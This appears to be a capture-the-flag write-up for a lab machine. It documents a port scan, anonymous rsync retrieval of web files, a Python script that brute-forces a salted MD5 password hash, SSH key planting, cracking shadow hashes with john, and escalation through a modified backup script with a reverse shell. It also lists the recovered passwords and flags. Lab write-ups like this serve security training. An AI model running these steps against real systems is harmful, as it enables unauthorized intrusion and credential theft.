Scan :

```sh
21/tcp  open  ftp     vsftpd 3.0.5
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 516254e8c91bab8266a85b6b83fa3294 (ECDSA)
|_  256 8a2c9a78812ba19a10bb00bfeecbf832 (ED25519)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
|_http-server-header: Apache/2.4.52 (Ubuntu)
873/tcp open  rsync   (protocol version 31)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```sh
rsync -av rsync://$target:873/httpd ./
```

```sh
1|admin|7658a2741c9df3a97c819584db6e6b3c
2|triss|a0de4d7f81676c3ea9eabcadfd2536f6
```

- Easy Brute force :
```sh
import hashlib

# Function to compute the MD5 hash of a given string
def compute_md5_hash(input_string):
    return hashlib.md5(input_string.encode()).hexdigest()

# Given parameters
secure_string = '6c4972f3717a5e881e282ad3105de01e'  # Replace with actual secure string
username = 'triss'  # Replace with actual username
target_hash = 'a0de4d7f81676c3ea9eabcadfd2536f6'

# Open and read the file containing potential passwords
with open('/usr/share/wordlists/rockyou.txt', 'r') as file:
    for line in file:
        # Remove any leading/trailing whitespace characters like newlines
        password = line.strip()
        
        # Create the string to be hashed
        string_to_hash = f'{secure_string}|{username}|{password}'
        
        # Compute the hash of the string
        hashed_string = compute_md5_hash(string_to_hash)
        
        # Compare with the given hash
        if hashed_string == target_hash:
            print(f'Password found: {password}')
            break
    else:
        print('Password not found in the file.')
```

- Password found : gerald

- Foothold : We have write access and there is an ssh port open so we can create an .ssh folder with an authorized_keys to be able to connect with ssh 

- We found a backup directory we extract it on our machine and got passwd and shadow file so we tried to cracks it :

```sh
unshadow passwd shadow > unshadowed.txt 

john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

sakura           (sa)     
gerald           (jennifer)     
gerald           (triss) 
```

- User : VL{bcf845cf94864fbba7e016d9fcd3a2db} 

- We see that sakura has write permission on backup file so we modify the file un put another reverse shell and wait : 
![[sync.png]]
- Root : VL{1ce8506d2bec0abb03177353db237e1b}